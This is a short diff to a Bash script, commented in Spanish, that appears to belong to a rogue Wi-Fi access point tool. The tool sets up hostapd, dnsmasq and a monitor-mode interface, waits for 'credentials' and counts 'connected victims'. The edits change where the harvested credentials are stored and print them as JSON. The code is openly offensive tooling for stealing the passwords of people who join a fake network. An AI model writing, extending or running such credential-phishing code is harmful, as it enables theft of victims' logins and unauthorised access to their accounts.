@@ -18,7 +18,7 @@ function ctrl_c(){
 	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
 	rm dnsmasq.conf hostapd.conf 2>/dev/null
 	rm -r iface 2>/dev/null
-	find \-name datos-privados.txt | xargs rm 2>/dev/null
+	find \-name datos-privados.json | xargs rm 2>/dev/null
 	sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
 	iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
 	ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
@@ -73,7 +73,7 @@ function getCredentials(){
 		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
 		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
 		echo -e "${redColour}Víctimas conectadas: ${endColour}${blueColour}$activeHosts${endColour}\n"
-		find \-name datos-privados.txt | xargs cat 2>/dev/null
+		find \-name datos-privados.json |xargs python -m json.tool 2>/dev/null
 		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
 		activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
 		sleep 3; clear
